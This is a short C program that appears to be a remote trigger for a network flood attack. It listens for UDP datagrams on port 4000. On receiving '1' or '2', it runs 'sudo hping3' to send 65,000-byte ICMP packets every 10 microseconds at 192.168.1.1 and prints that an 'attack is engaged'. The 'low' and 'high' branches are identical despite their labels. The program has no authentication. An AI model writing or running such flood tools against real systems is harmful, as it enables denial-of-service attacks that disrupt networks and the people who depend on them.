#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <arpa/inet.h>
#include <sys/types.h>
#include <sys/socket.h>

// Socket programming		
int sock;
int server_addr_size, client_addr_size;
struct sockaddr_in server_addr, client_addr;
int len = 0;
// Receive buffer
unsigned char buff_rcv[50];		

int main(){

    sock = socket(PF_INET,SOCK_DGRAM,0);
	// Socket error
	if(sock == -1){
		printf("socket creation error\n");
		exit(1);
	}

    // Check socket buffer
	int remainSize;
	memset(&server_addr,0, sizeof(server_addr));
	server_addr.sin_family		= AF_INET;
	server_addr.sin_port		= htons(4000);
	server_addr.sin_addr.s_addr	= htonl(INADDR_ANY);
	
	printf("Start socket binding\n");
	if( bind(sock, (struct sockaddr*)&server_addr, sizeof(server_addr)) == -1){
		printf("bind() error");
		exit(1);
	}
    printf("Complete\n");

    while(1){
        client_addr_size = sizeof(client_addr);
		// Wait input signal. (control or roundtrip time)
		len = recvfrom(sock, buff_rcv, 50, 0, (struct sockaddr*)&client_addr, &client_addr_size);
        if(!strncmp(buff_rcv, "1", 1)){
            int ret = system("sudo hping3 --icmp 192.168.1.1 -d 65000 -i u10");
			memset(buff_rcv, '\0', sizeof(buff_rcv));
            printf("low attack is engaged");
            break;
        }
        if(!strncmp(buff_rcv, "2", 1)){
            int ret = system("sudo hping3 --icmp 192.168.1.1 -d 65000 -i u10");
			memset(buff_rcv, '\0', sizeof(buff_rcv));
            printf("high attack is engaged");
            break;
        }
    }
    return 0;
}